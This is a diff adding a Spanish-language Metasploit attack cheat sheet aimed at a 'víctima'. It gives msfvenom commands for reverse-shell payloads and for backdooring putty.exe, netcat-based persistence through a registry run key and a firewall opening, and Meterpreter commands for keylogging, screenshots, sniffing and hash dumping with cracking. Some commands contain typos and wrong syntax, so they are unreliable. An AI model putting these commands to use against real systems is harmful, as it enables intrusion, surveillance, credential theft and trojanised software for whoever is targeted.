@@ -1,0 +1,70 @@
+*Generar un payload con msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=666 -e x86/shikata_ga_nai -f exe > shell.exe
+
+*Meterpreter
+	*Escalada de privilegios
+	use priv -> escalar privilegios
+	getsystem -> Ver que somos
+	getuid ->Ver informacion de la sesion
+
+	*Persistencia
+	upload /home/raul/nc.exe C:\\windoiws\\system32
+	reg enumkey -h HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+	execute -f cmd -i
+	netsh firewall add portopening TCP 445 ·Service Firewall" ENABLE ALL
+	nc -v 192.168.0.28 -> nueva conexion
+
+	*Sniffer
+	use sniffer
+	sniffer_interfaces -> para ver la interfaz de red
+	sniffer_start 1
+	#Con whireshark podemos ver el trafico
+
+	*Captura de pantalla
+	screenshot
+
+	*Buscar información
+	search -f *.jpg -> buscará todas las imagenes .jpg que contenga la víctima
+	moverse mediante cd y ls
+	
+*John The Ripper
+Con hashdump obtenemos los hashes
+run auxiliary/analyze/jtr_crack_fast -> asi sacará los usuarios y contraseñas del equipo víctima
+
+*Se puede hacer un script para que sea más comodo y más rapido abrir una sesión meterpreter.
+
+*KeyLogging
+keyscan_start
+keyscan_dump -> nos saldrán las teclas registradas junto con los saltos de linea.
+
+*Backdoorizando archivos .exe (ejemplo putty)
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.123 -e x86/shigata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+
+*Armitage
+Entorno gráfico de metasploit
+Escrito en Java y pensado para acelerar los procesos de metasploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
